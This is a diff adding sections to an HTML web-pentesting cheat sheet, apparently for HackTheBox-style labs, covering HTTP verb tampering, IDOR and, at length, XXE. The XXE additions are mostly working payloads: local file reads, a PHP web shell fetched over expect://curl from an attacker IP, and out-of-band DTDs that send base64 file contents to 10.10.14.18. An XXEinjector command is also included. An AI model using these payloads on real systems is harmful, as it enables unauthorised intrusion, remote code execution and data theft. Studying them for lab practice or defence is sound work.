@@ -52,10 +52,47 @@ gobuster vhost -u http://inlanefreight.htb:53137 -w /usr/share/seclists/Discover
                     <h3>Remember that eventhough a web folder returns forbidden you can enumerate inside of it and you may found something interesting. Try out with different dictionaries</h3>
                     <p>Useful subdomain worlist for enumeration are: <a class="notion-link" href="https://github.com/n0kovo/n0kovo_subdomains">n0kovo_subdomains</a> or <b>seclists/Discovery/DNS/subdomains-top1million-5000.txt</b> </p>
                 </ul>
-
+            </div>
                 <h2>Exploitation</h2>
                 <ul>
-                </div>
+                        <h2 id="HTTP Verb tampering">HTTP Verb tampering</h2>
+                        <ul>
+                            <p>This technique consists in trying different HTTP methods againts a web application. Perfoming that you could be able to bypass some security filters</p>
+                            <p>First of all it is a good option to perform a <b>OPTIONS</b> request againts the web server to check which methods are allowed</p>
+                            <pre><code class="language-bash">curl -i -X OPTIONS http://SERVER_IP:PORT/   #It may not show the allowed methods...</code></pre>
+                            <p>Once you now which methods are allowed you could intercept specific request and attempt to change the http request method. Here we have all the different methods</p>
+                            <pre><code class="language-bash">GET | POST | HEAD | PUT | DELETE | OPTIONS | PATCH </code></pre>
+                            
+                            <h3>From Verb tampering to RCE</h3>
+                            <ul>
+                            <p>It could be the case where you find a website which is blocking all your attempts to perform a command injection. In this case we could attempt to change the HTTP request method from <b>GET</b> to <b>POST</b> and you may be able to bypass the security filter. Once bypassed you could try again to inject commands</p>    
+                            </ul>
+                        </ul>
+
+                        <h2 id="IDOR: Insecure Direct Object References">IDOR: Insecure Direct Object References</h2>
+                        <ul>
+                            <p>is a type of access control vulnerability where an application exposes a direct reference to an internal object (such as a user ID, file name, or database key) without properly verifying whether the user is authorized to access it.</p>
+                            <h3>Classic IDOR</h3>
+                            <ul>
+                                <p>The most basic type of IDOR is the one which can be found in website where userid is used and there is no access control at the backend. In this case we would be able to modify the userID in order to check for other user files</p>
+                            </ul>
+                            
+                            <h3>Encoded IDOR</h3>
+                            <ul>
+                                <p>In some cases you'll find out that the parameter which is being passed it is encoded or double encoded. In this case it is recommended to use Burp Suite in order to apply some payload processing when performing some fuzzing attack</p>
+                            </ul>
+
+                            <h3>API IDOR</h3>
+                            <ul>
+                                <p>In case you are in front of an which managed user and pass the uid parameter in the http request (GET, POST, PUT) you should perform the following</p>
+                                <ul>
+                                    <li>Identify is there is a parameter which shows who is admin. In case you don't now the role name you could try to show information about all users to find it's name</li>
+                                    <li>Once you now the name attempt to change that parameter value on a user you control. That way you would become admin</li>
+                                </ul>        
+                            </ul>
+                            
+                        </ul>
+
                         <h2 id="LFI: Local File Inclusion">LFI: Local File Inclusion</h2>
                         <ul>
                             <h3>Basic path traversal payloads</h3><pre><code class="language-url">http://.../index.php?language=../../../../etc/passwd
@@ -485,15 +522,153 @@ Invoke-DOSfuscation</code></pre>
 
                         <h2 id = "XXE: XML external entity" >XXE: XML external entity</h2>
                         <ul>
-                            <p>Consists in a vulnerability that occurs when an aplicaciotn process XML without disabling external entities, allowing an attacker to manipulate how data is interpreted</p>
-                            <pre><code class="language-js">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE foo [
-&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
-]>
-&lt;user&gt;
-  &lt;name&gt;&xxe;&lt;/name&gt;
-&lt;/user&gt;</code></pre>
+                        <p>Consists in a vulnerability that occurs when an aplicaciotn process XML without disabling external entities, allowing an attacker to manipulate how data is interpreted</p>
+                            <p>After all it is recommended to understand how XML works</p>
+                            <h3>Usage</h3>
+                            <ul>
+                                <p>Inside an XML file we can find different objects. First we have the <b>DTD (Document type definiton)</b> which defines the structure of the XML</p>
+                                <pre><code class="language-js">&lt;!DOCTYPE email SYSTEM "email.dtd"&gt;</code></pre>
+                                <p>Then we have the XML entities which are like variables</p>
+                                <pre><code class="language-js">&lt;!ENTITY company "Inlane Freight"&gt;</code></pre>
+                                <p>Those can be used like this</p>
+                                <pre><code class="language-js">&company;</code></pre>
+                            </ul>
+                            <h3>Basic payloads</h3>
+                            <ul>
+                            <p><b>IMPORTANT!</b> You'll need to find out which elements are displayed in the website in order to inject XML code to be displayed in the website</p> 
+                            <p>Since you can define entities (variables) you are able to point this ones to local files</p>
+                            <pre><code class="language-xml">&lt;!ENTITY signature SYSTEM "file:///var/www/html/signature.txt"&gt;</code></pre>
+                            <p><b>How can we test for an XXE?</b>If we suspect that some website could be executing our XML code we can try the following. In a case where the content between <b>&lt;email&gt;&lt;/email&gt;</b> is being showed we could try to check if the XML is being executed with the following code which will show the content of is_executed variable in the screen</p>
+                            <pre><code class="language-xml">&lt;!DOCTYPE email [
+  &lt;!ENTITY Entity_Name "XML is being executed"&gt;
+]&gt;</code></pre>    
+                            <p>So all the request should be that way</p>
+                            
+                            <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?>
+&lt;!DOCTYPE root [
+  &lt;!ENTITY email SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;name&gt;name&lt;/name&gt;
+  &lt;tel&gt;tel&lt;/tel&gt;
+  &lt;email&gt;&email;&lt;/email&gt;
+  &lt;message&gt;message&lt;/message&gt;
+&lt;/root&gt;</code></pre>
+                         
+                        
+                        <p>In the previous case there wasn't any <b>DTD</b> so we were able to define ours using <b>&lt;!DOCTYPE root [...]&gt;</b>. In case were already exists a DTD we can perform</p>
+                        <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?>
+&lt;!DOCTYPE root SYSTEM "contact.dtd" [
+  &lt;!ENTITY email SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;name&gt;name&lt;/name&gt;
+  &lt;tel&gt;tel&lt;/tel&gt;
+  &lt;email&gt;&email;&lt;/email&gt;
+  &lt;message&gt;message&lt;/message&gt;
+&lt;/root&gt;</code></pre>
+                     </ul>
+                     
+                     <h3>Reading source code</h3>
+                     <ul>
+                        <p>With some filtering we could be able to show some code. With the following code we will be able to read any file since it will output its code in base64 instead of being executed by the browser</p>
+                        <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?>
+  &lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;
+]&gt;</code></pre>
+                        <p>There are some methods we could try.</p>
+                        <h4>Reading SSH private keys</h4>
+                        <ul>
+                            <p>Reading id_rsa keys (SSH Private Key) from some user we have access to. Rember (/home/user/ssh/id_rsa)</p>
                         </ul>
+                        <h4>Using PHP://expect</h4>
+                        <ul>
+                            <p>In case the expect wrapper is enabled we can use it to inject some basic commands. If we use some flags or slashes it may broke due the xmp format</p>
+                            <pre><code class="language-php">expect://id</code></pre>
+                        
+                            <p>We could try to host some malicious php file and ettempt to perform a curl request from our victim in order to gather that file. Then just browse the file and execute it</p>
+                            <pre><code class="language-bash">echo '&lt;?php system($_REQUEST["cmd"]);?&gt;' &lt; shell.php</code></pre>
+                            <p>From our victim...</p>
+                            <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?>
+&lt;!DOCTYPE root SYSTEM "contact.dtd" [
+  &lt;!ENTITY email SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;name&gt;name&lt;/name&gt;
+  &lt;tel&gt;tel&lt;/tel&gt;
+  &lt;email&gt;&email;&lt;/email&gt;
+  &lt;message&gt;message&lt;/message&gt;
+&lt;/root&gt;</code></pre>
+                        </ul>
+
+                     <h4>Advanced Exfiltration</h4>
+                     <ul>
+                        <p>In case the previous methods are not working we can try to wrap the content of the external file reference with a CDATA tag (e.g. <b>&lt;![CDATA[ FILE_CONTENT ]]&gt;</b>)</p>
+                        <p>An easy weay is to define a begin internal entity and an end internal entity <b>In this case you only need to reference the joined variable in order to print the content of the file</b></p>
+                        <p>First create a file in your target system and setup the following content with the file you would like to view</p>
+                        <pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///flag.php">
+&lt;!ENTITY % start "&lt;![CDATA["&gt;
+&lt;!ENTITY % end "]]&gt;"&gt;
+&lt;!ENTITY % all "&lt;!ENTITY fileContents 
+'%start;%file;%end;'&gt;"&gt;</code></pre>
+                       <p>Then start a python webserver to make the file remotely accessible </p>
+                       <p>Finally perform a request to the victim server requesting a the file you created in your attacker machine</p> 
+                        <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE email [
+  &lt;!ENTITY % dtd SYSTEM
+  "http://10.10.14.18:8000/xxe.dtd"&gt;
+  %dtd;
+  %all;
+]&gt;</code></pre>    
+                        </ul>   
+                        <h4>Error based XXE</h4>
+                        <ul>
+                        <p>In some cases you'll find out that you can't perform any previously file read. In that case an option is to create an error in the XML to check if we can disclose some information. <b>Example: &lt;root&gt; &lt;/rot&gt;</b> simply remove a letter. If your screen fills up with a lot of errors you won. Check out if the path of the webserver is disclosed</p>
+                        <p>First create a file and introduce the following content pointing to the file you would like to read</p>  
+                        <pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/hosts"&gt;
+&lt;!ENTITY % error "&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;"&gt;</code></pre>
+                        <p>Then start a python webserver to make the file remotely accessible </p>
+                        <p>Finally perform a request to the victim server requesting a the file you created in your attacker machine. <b>This method is cluncky since it is possible that you are no able to view all file content due legnth of the error variable</b></p> 
+                        <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE email [ 
+  &lt;!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"&gt;
+  %remote;
+  %error;
+]&gt;</code></pre>
+                        </ul>
+                        
+                        <h4>Blid data exfiltration</h4>
+                        <ul>
+                            <p>In a case where you do not have any output output containing any of our XML input entities. We could trick the server to perform a connection to our malicious server</p>
+                            <p>Open a webserver and capture a http request which contains some XML code. Then insert the following</p>
+                            <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+&lt;!ENTITY % oob "&lt;!ENTITY content SYSTEM 'http://10.10.14.18:8000/?content=%file;'&gt;"&gt;</code></pre>
+                            <p>Then youll recive a request in your attacker webserver with the content of the file in base64</p>    
+                            <p><b>You can automate all process by using the tools XXEinjector with the following command but first you'll need to capture the POST/GET request and insert the string (XXEINJECT) at the end. Here goes an example</b></p>  
+                            <pre><code class="language-xml">POST /blind/submitDetails.php HTTP/1.1
+Host: 10.129.201.94
+Content-Length: 169
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+...
+...
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+XXEINJECT</code></pre>
+                            <p>Save that file and execute the following</p>
+                            <pre><code class="language-xml">ruby XXEinjector.rb --host=10.10.14.18 --httpport=8000 --file=xxe.req --path=/index.php --oob=http --phpfilter --verbose</code></pre>
+                            
+
+
+                            
+                            
+                        </ul>
+
+                        
+                        </ul>
+                     </ul>
+                </ul>
 
                         <h2 id = "XSLT Injections" >XSLT Injections</h2>
                         <ul>
